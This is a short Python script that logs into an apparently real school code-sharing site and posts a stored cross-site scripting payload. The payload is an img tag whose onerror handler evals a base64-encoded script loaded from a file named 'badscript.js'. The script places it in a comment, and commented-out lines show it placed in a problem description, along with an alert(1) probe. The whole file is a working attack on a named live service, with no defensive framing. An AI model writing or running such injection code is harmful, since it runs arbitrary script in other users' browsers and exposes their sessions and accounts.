import requests
import json
import base64
DOMAIN = "https://pyshare.noj.tw"

def login(username:str, password:str)->requests.Session:
    url = f"{DOMAIN}/api/auth/session"
    sess = requests.session()
    with sess.post(url, json={
        "password":password,
        "school":"NTNU",
        "username":username
    }) as resp:
        if resp.status_code != 200:
            return None
    return sess

def create_problem(
    sess:requests.Session,
    title:str,
    description:str,
    course_id:str):
    url = f"{DOMAIN}/api/problem"
    with sess.post(url, json={
        "title":title,
        "description":description,
        "tags":["體育"],
        "status":1,
        "attachments":[],
        "defaultCode":"",
        "isTemplate":False,
        "allowMultipleComments":True,
        "course":course_id
    }) as resp:
        if resp.status_code == 200:
            return json.loads(resp.text)['data']['pid']
    return -1

def create_comment(
    sess:requests.Session,
    pid:int,
    title:str,
    content:str,
    code = "print('a')"
    ):
    url = f"{DOMAIN}/api/comment"
    with sess.post(url, json={
        "target": "problem", 
        "id": pid, 
        "title": title, 
        "content": content, 
        "code": code
    }) as resp:
        if resp.status_code == 200:
            return resp.json()["data"]["id"]
        print(resp.text)
    return None
def main():
    cred = json.loads(open("cred.json", "r").read())
    sess = login(cred["username"], cred["password"])
    payload = base64.b64encode(open("badscript.js", 'r').read().encode()).decode()
    #print(create_problem(sess, "aaaaaa", f"<img src='' onerror='javascript:eval(atob(\"{payload}\"))'>", "605a1ef29060c7c239d05488"))
    #print(create_problem(sess, "aaaaaa", f"<img src='aaaa' onerror='javascript:alert(1)'>", "605a1ef29060c7c239d05488"))
    print(create_comment(sess, 273, "test", f"<img src='' onerror='javascript:eval(atob(\"{payload}\"))'>"))

if __name__ == "__main__":
    main()
